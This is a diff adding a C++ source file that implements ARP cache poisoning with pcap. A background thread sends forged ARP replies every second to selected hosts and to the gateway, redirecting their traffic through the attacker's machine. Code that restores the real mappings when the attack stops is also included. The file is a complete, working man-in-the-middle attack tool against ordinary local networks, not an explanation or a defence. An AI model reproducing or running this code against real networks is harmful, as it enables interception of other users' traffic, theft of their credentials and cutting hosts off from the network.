@@ -1,0 +1,114 @@
+#include "stdafx.h"
+#include "ARPCheat.h"
+#include "ThreadPool.h"
+#include "Helper.h"
+#include "NetManager.h"
+#include "Packet.h"
+
+
+ARPCheat::Config& ARPCheat::GetConfig(IpAddress ip)
+{
+	return m_attackList[ip];
+}
+
+void ARPCheat::SetConfig(IpAddress ip, bool attack, bool cheatTarget, bool cheatGateway)
+{
+	Config& config = GetConfig(ip);
+	bool recoverTarget = (config.attack && !attack) || (config.cheatTarget && !cheatTarget);
+	bool recoverGateway = (config.attack && !attack) || (config.cheatGateway && !cheatGateway);
+	config.attack = attack;
+	config.cheatTarget = cheatTarget;
+	config.cheatGateway = cheatGateway;
+
+	if (!recoverTarget && !recoverGateway)
+		return;
+
+	// recover
+	AdapterHandle adapter(GetAdapterHandle());
+	if (adapter == nullptr)
+		return;
+
+	MacAddress targetMac = g_netManager.m_host[ip];
+	ARPPacket packet(false);
+	// send to target
+	if (recoverTarget)
+	{
+		packet.SetSender(g_netManager.m_selfGateway, g_netManager.m_gatewayMac);
+		packet.SetTarget(ip, targetMac);
+		pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
+	}
+	// send to gateway
+	if (recoverGateway)
+	{
+		packet.SetSender(ip, targetMac);
+		packet.SetTarget(g_netManager.m_selfGateway, g_netManager.m_gatewayMac);
+		pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
+	}
+}
+
+void ARPCheat::StartAttack()
+{
+	m_isAttacking = true;
+	m_cheatThread = std::thread([=]{
+		AdapterHandle adapter(GetAdapterHandle());
+		if (adapter == nullptr)
+			return;
+
+		ARPPacket packet(false);
+		packet.SetSender(0, g_netManager.m_selfMac);
+		// send
+		while (m_isAttacking)
+		{
+			DWORD time = GetTickCount();
+			{ SyncMap<IpAddress, Config>::lock_guard lock(m_attackList.m_lock);
+				for (const auto& i : m_attackList)
+				{
+					if (!i.second.attack)
+						continue;
+					if (i.second.cheatTarget) // send to target
+					{
+						packet.SetTarget(i.first, g_netManager.m_host[i.first]);
+						packet.senderIp = g_netManager.m_selfGateway;
+						pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
+					}
+					if (i.second.cheatGateway) // send to gateway
+					{
+						packet.SetTarget(g_netManager.m_selfGateway, g_netManager.m_gatewayMac);
+						packet.senderIp = i.first;
+						pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
+					}
+				}
+			}
+			Sleep(1000 - (GetTickCount() - time));
+		}
+
+		//////////////////////////////////////////////////////////////////////////////
+		// stop attacking
+
+		// recover
+		{ SyncMap<IpAddress, Config>::lock_guard lock(m_attackList.m_lock);
+			for (const auto& i : m_attackList)
+			{
+				if (!i.second.attack)
+					continue;
+				MacAddress targetMac = g_netManager.m_host[i.first];
+				// send to target
+				packet.SetSender(g_netManager.m_selfGateway, g_netManager.m_gatewayMac);
+				packet.SetTarget(i.first, targetMac);
+				pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
+				// send to gateway
+				packet.SetSender(i.first, targetMac);
+				packet.SetTarget(g_netManager.m_selfGateway, g_netManager.m_gatewayMac);
+				pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
+			}
+		}
+
+		TRACE("cheat end\n");
+	});
+}
+
+void ARPCheat::StopAttack()
+{
+	m_isAttacking = false;
+	m_cheatThread.join();
+}
